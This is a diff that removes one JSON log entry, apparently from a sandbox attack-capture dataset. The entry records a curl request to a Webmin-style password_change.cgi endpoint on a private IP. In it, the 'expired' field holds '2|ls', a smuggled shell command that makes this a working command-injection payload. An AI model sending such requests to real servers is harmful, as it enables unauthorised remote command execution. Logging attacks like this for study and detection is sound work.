@@ -1,1 +1,0 @@
-{"sandbox_id": "85", "timestamp_str": "2020-07-15T09:57:09.840118+02:00", "cmd_type": "bash-command", "cmd": "curl http://172.18.1.5:10000/password_change.cgi -d 'user=root&pam=&expired=2|ls&old=foo&new1=bar&new2=bar' -H\"Referer: http://172.18.1.5:10000\""}
